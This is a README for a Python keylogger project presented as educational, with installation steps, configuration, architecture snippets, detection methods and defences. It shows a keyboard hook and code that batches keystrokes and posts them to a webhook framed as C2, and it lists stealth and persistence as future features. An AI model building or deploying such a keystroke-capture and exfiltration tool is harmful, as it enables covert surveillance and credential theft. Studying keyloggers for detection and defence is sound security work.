# Educational Keylogger

A Keylogger built with modern Python 3.13+ for educational purposes, security research, and authorized penetration testing.

## Legal Disclaimer

**IMPORTANT**: This software is provided for educational and research purposes only. Unauthorized use of keyloggers is illegal and unethical.

- **Legal uses**: Personal learning, authorized penetration testing, security research on your own systems
- **Illegal uses**: Monitoring others without consent, corporate espionage, stalking, identity theft

**By using this software, you agree to use it only on systems you own or have explicit written permission to monitor.**

---

## Features

### Core Functionality
- **Keyboard Event Capture**: Real time logging of all keyboard events using `pynput`
- **Timestamped Logs**: Every keystroke recorded with microsecond precision
- **Active Window Tracking**: Captures which application was active during each keystroke
- **Special Key Detection**: Logs function keys, modifiers (Ctrl, Alt, Shift), and control characters

### Advanced Features
- **Log Rotation**: Automatic file rotation when logs exceed configurable size (default: 5MB)
- **Toggle Control**: Press F9 to pause/resume logging without stopping the process
- **Remote Delivery**: Webhook based batch delivery for C2 (Command & Control) simulation
- **Cross-Platform**: Works on Windows, macOS, and Linux with platform specific optimizations

### Code Quality
- **Modern Python 3.13+**: Uses latest syntax (native type hints, `match` statements, dataclasses)
- **Type Safety**: Full type hints throughout codebase
- **Thread-Safe**: Lock based synchronization for concurrent operations
- **Clean Architecture**: Separation of concerns with dedicated classes for logging, delivery, tracking
- **Graceful Shutdown**: Proper cleanup and buffer flushing on exit

---

## Installation

### Prerequisites
- Python 3.13 or higher
- pip package manager

### Quick Start (Recommended - Using Makefile)
```bash
cd keylogger/

# Create virtual environment and install everything
make setup

# Run tests to verify installation
make test

# Run linting checks
make lint
```

### Manual Installation

**Option 1: Install from pyproject.toml (Recommended)**
```bash
# Create virtual environment
python -m venv venv

# Activate virtual environment
source venv/bin/activate  # Linux/macOS
# or
venv\Scripts\activate     # Windows

# Install main dependencies
pip install -e .

# Or install with dev tools (linters, formatters, type checkers)
pip install -e ".[dev]"
```

**Option 2: Install from requirements.txt**
```bash
pip install -r requirements.txt
```

### Platform-Specific Dependencies

**Windows** (for enhanced window tracking):
```bash
pip install -e ".[windows]"
# or manually:
pip install pywin32==311 psutil==7.1.3
```

**macOS** (for window tracking):
```bash
pip install -e ".[macos]"
# or manually:
pip install pyobjc-framework-Cocoa==12.0
```

**Linux** (requires xdotool):
```bash
sudo apt-get install xdotool  # Debian/Ubuntu
# or
sudo yum install xdotool       # RHEL/CentOS
```

---

## Usage

### Basic Usage
```bash
python keylogger.py
```

### Configuration

Edit the `main()` function in `keylogger.py` to customize behavior:

```python
config = KeyloggerConfig(
    log_dir=Path.home() / ".keylogger_logs",     # Where to save logs
    max_log_size_mb=5.0,                         # Max size before rotation
    webhook_url="https://your-webhook.com/log",  # Optional remote delivery
    webhook_batch_size=50,                       # Events per batch
    toggle_key=Key.f9,                           # Key to pause/resume
    enable_window_tracking=True,                 # Track active windows
    log_special_keys=True                        # Log Ctrl, Alt, etc.
)
```

### Controls
- **F9**: Toggle logging on/off
- **Ctrl+C**: Stop keylogger and exit

### Example Output
```
[2025-11-12 14:30:15] [chrome.exe - Google] Hello world
[2025-11-12 14:30:18] [chrome.exe - Google] [ENTER]
[2025-11-12 14:30:20] [notepad.exe - Untitled] This is a test[BACKSPACE][BACKSPACE][BACKSPACE][BACKSPACE]
```

---

## Technical Architecture

### Class Structure

```
Keylogger (Main orchestrator)
├── KeyloggerConfig (Dataclass for configuration)
├── LogManager (File I/O and rotation)
├── WebhookDelivery (Remote C2 delivery)
├── WindowTracker (OS-specific window detection)
└── KeyEvent (Dataclass for event storage)
```

### How It Works

#### 1. **Event Capture** (`pynput.keyboard.Listener`)
The keylogger uses `pynput`'s event driven model to hook into keyboard events at the OS level:

```python
self.listener = keyboard.Listener(on_press=self._on_press)
```

When a key is pressed, the OS notifies `pynput`, which calls our `_on_press()` callback.

#### 2. **Key Processing**
Raw key events are converted to human readable strings:
- **Regular characters**: `'a'`, `'B'`, `'1'`, `'@'`
- **Special keys**: `[SPACE]`, `[ENTER]`, `[BACKSPACE]`
- **Modifiers**: `[CTRL]`, `[ALT]`, `[SHIFT]`

#### 3. **Window Context**
Platform specific APIs capture the active window:
- **Windows**: `win32gui.GetForegroundWindow()` + `psutil`
- **macOS**: `NSWorkspace.sharedWorkspace().activeApplication()`
- **Linux**: `xdotool getactivewindow getwindowname`

Window checks are rate-limited (500ms intervals) to reduce overhead.

#### 4. **Log Management**
Logs are written to disk with automatic rotation:

```python
def _check_rotation(self) -> None:
    current_size_mb = self.current_log_path.stat().st_size / (1024 * 1024)
    if current_size_mb >= self.config.max_log_size_mb:
        # Create new log file and close old one
```

Thread-safe writes using `threading.Lock` ensure data integrity.

#### 5. **Remote Delivery**
Events are batched and delivered via HTTP POST:

```python
payload = {
    "timestamp": "2025-11-12T14:30:15",
    "host": "victim-machine",
    "events": [
        {"timestamp": "...", "key": "a", "window_title": "chrome.exe"},
        ...
    ]
}
requests.post(webhook_url, json=payload)
```

This simulates real world C2 communication used in APT (Advanced Persistent Threat) campaigns.

---

## Detection Methods

### How to Detect Keyloggers

#### 1. **Process Monitoring**
Look for suspicious Python processes:
```bash
# Linux/macOS
ps aux | grep python

# Windows
tasklist | findstr python
```

#### 2. **Network Traffic Analysis**
Monitor outbound HTTP requests:
```bash
# Use Wireshark to inspect POST requests
# Look for JSON payloads with keyboard data
```

#### 3. **File System Monitoring**
Check for new log directories:
```bash
# This keylogger creates logs in:
ls -la ~/.keylogger_logs/
```

#### 4. **Behavioral Analysis**
- High CPU usage from Python processes
- Unusual network connections to unknown endpoints
- Hidden console windows (Windows)

#### 5. **Anti-Virus / EDR**
Modern EDR (Endpoint Detection and Response) solutions detect:
- `pynput` library usage patterns
- Keyboard hook installation
- Unusual file I/O patterns

---

## Defense Strategies

### For Users
1. **Use Anti Keylogger Software**
   - Zemana AntiLogger
   - SpyShelter
   - Malwarebytes

2. **Enable System Integrity Protection**
   - Windows: Enable Secure Boot and BitLocker
   - macOS: Keep SIP enabled
   - Linux: Use AppArmor or SELinux

3. **Monitor Startup Items**
   ```bash
   # Windows: Check Task Scheduler and Startup folder
   # Linux: Check ~/.config/autostart/
   # macOS: Check System Preferences > Users > Login Items
   ```

4. **Use Virtual Keyboards**
   - For sensitive passwords, use on-screen keyboards
   - Many banking sites provide virtual keypads

### For Organizations
1. **Application Whitelisting**: Only allow approved executables
2. **Network Segmentation**: Detect unusual outbound traffic
3. **Regular Audits**: Scan for unauthorized software
4. **User Training**: Educate about phishing and social engineering
5. **Privileged Access Management**: Limit admin rights to prevent installation

---

## Testing & Validation

### Running Tests
Verify all components work correctly:
```bash
# Using Makefile
make test

# Or run directly
python test_keylogger.py
```

The test suite validates:
- KeyType enum functionality
- KeyloggerConfig initialization
- KeyEvent serialization
- LogManager file operations and rotation
- WindowTracker platform detection
- WebhookDelivery buffering logic
- Key processing functions

### Code Quality Checks
Run all linting and type checking:
```bash
# Using Makefile (recommended)
make lint

# Or run individually
ruff check keylogger.py
pylint keylogger.py
mypy keylogger.py
```

### Running in Safe Mode
For learning purposes, test on an isolated VM:
```bash
# Create a test VM (VirtualBox, VMware, etc.)
# Install Python and run keylogger
# Monitor logs in real-time
tail -f ~/.keylogger_logs/keylog_*.txt
```

### Webhook Testing
Use a free webhook testing service:
- [webhook.site](https://webhook.site) - Get instant webhook URL
- [requestbin.com](https://requestbin.com) - Inspect HTTP requests

Update `webhook_url` in config:
```python
config = KeyloggerConfig(
    webhook_url="https://webhook.site/your-unique-id"
)
```

---

## 📊 Code Highlights

### Modern Python 3.13+ Features

**Native Type Hints** (no `typing` imports needed):
```python
def to_dict(self) -> dict[str, str]:  # Not Dict[str, str]
    return {"key": "value"}
```

**Union Types**:
```python
def _on_press(self, key: Key | KeyCode) -> None:  # Not Union[Key, KeyCode]
    ...
```

**Dataclasses** for clean data structures:
```python
@dataclass
class KeyEvent:
    timestamp: datetime
    key: str
    window_title: Optional[str] = None
```

**Context Managers** for resource management:
```python
with self.lock:
    self.logger.info(event.to_log_string())
```

**Pathlib** for cross-platform file operations:
```python
self.config.log_dir / f"{self.config.log_file_prefix}_{timestamp}.txt"
```

---

## Educational Use Cases

### 1. **Security Research**
- Study how keyloggers bypass modern security software
- Test EDR detection capabilities
- Analyze C2 communication patterns

### 2. **Penetration Testing**
- Post-exploitation credential harvesting simulation
- Red team exercises (with authorization)
- Social engineering awareness training

### 3. **Software Development**
- Learn event-driven programming patterns
- Practice multi-threaded application design
- Understand OS-level API interactions

### 4. **Digital Forensics**
- Understand how attackers collect data
- Practice incident response procedures
- Learn to identify keylogger artifacts

---

## Troubleshooting

### Common Issues

**Import Error: pynput not found**
```bash
pip install pynput
```

**Permission Denied (Linux/macOS)**
```bash
# May need to run with sudo for keyboard access
sudo python keylogger.py
```

**Window Tracking Not Working**
- **Windows**: Install `pip install pywin32 psutil`
- **macOS**: Grant accessibility permissions in System Preferences
- **Linux**: Install xdotool via package manager

**Webhook Delivery Failing**
- Check internet connectivity
- Verify webhook URL is correct
- Test webhook with `curl`:
  ```bash
  curl -X POST https://your-webhook.com/log \
    -H "Content-Type: application/json" \
    -d '{"test": "data"}'
  ```

---

## Project Structure

```
keylogger/
├── keylogger.py           # Main implementation (450+ lines)
├── test_keylogger.py      # Test suite (validates all components)
├── requirements.txt       # Python dependencies
├── pyproject.toml         # Project config (deps, linting, type checking)
├── Makefile              # Build automation (setup, test, lint)
└── README.md             # This file
```

---

## Future Enhancements

Potential features for advanced learning:
- [ ] Clipboard monitoring
- [ ] Screenshot capture on trigger words
- [ ] Process memory dumping
- [ ] Encrypted log storage
- [ ] Stealth mode (hidden console, anti-debug)
- [ ] Persistence mechanisms (Windows Registry, cron jobs)
- [ ] Mouse click coordinate logging
- [ ] Form field detection (highlight password fields)

---

## References & Further Reading

### Technical Documentation
- [pynput documentation](https://pynput.readthedocs.io/)
- [Python threading](https://docs.python.org/3/library/threading.html)
- [Python dataclasses](https://docs.python.org/3/library/dataclasses.html)

### Security Research
- [MITRE ATT&CK: Input Capture](https://attack.mitre.org/techniques/T1056/)
- [OWASP: Keylogger Detection](https://owasp.org/www-community/attacks/Keylogger)
- [Krebs on Security: Keylogger Case Studies](https://krebsonsecurity.com/)

### Academic Papers
- "A Survey of Keylogger Technologies" (IEEE Security & Privacy)
- "Detection of Keyloggers Using Machine Learning" (Journal of Cybersecurity)

---

## Author

Built as part of the **60 Cybersecurity Projects** repository.

**Purpose**: Educational demonstration of offensive security techniques and defensive countermeasures.

---

## License

This project is provided for educational purposes only. Use responsibly and ethically.

**NO WARRANTY**: This software is provided "as-is" without any warranties. The author is not responsible for any misuse or damage caused by this software.

---

## Acknowledgments

- **pynput** maintainers for the excellent keyboard library
- Security researchers who share knowledge about defensive measures
- The cybersecurity community for promoting ethical hacking practices

*CarterPerez-dev | 2025 | CertGames.com
